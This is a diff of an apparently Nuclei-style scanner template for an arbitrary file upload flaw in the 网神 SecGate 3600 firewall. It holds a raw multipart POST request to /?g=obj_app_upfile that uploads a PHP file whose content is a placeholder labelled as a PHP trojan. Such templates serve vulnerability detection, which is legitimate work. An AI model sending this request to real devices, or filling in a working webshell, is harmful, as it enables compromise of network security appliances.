@@ -3,14 +3,8 @@ info:
   name: 网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tf331soi2kfcu4xv
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tf331soi2kfcu4xv
-    fofa: 暂无
 http:
 - raw:
   - 'POST /?g=obj_app_upfile HTTP/1.1
@@ -25,14 +19,10 @@ http:
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
 
 
-
-
     ------WebKitFormBoundaryJpMyThWnAxbcBBQc
 
 
     Content-Disposition: form-data; name="MAX_FILE_SIZE"
-
-
 
 
     10000000
@@ -47,19 +37,13 @@ http:
     Content-Type: text/plain
 
 
-
-
     <?php php马?>
-
-
 
 
     ------WebKitFormBoundaryJpMyThWnAxbcBBQc
 
 
     Content-Disposition: form-data; name="submit_post"
-
-
 
 
     obj_app_upfile
@@ -69,8 +53,6 @@ http:
 
 
     Content-Disposition: form-data; name="__hash__"
-
-
 
 
     0b9d6b1ab7479ab69d9f71b05e0e9445
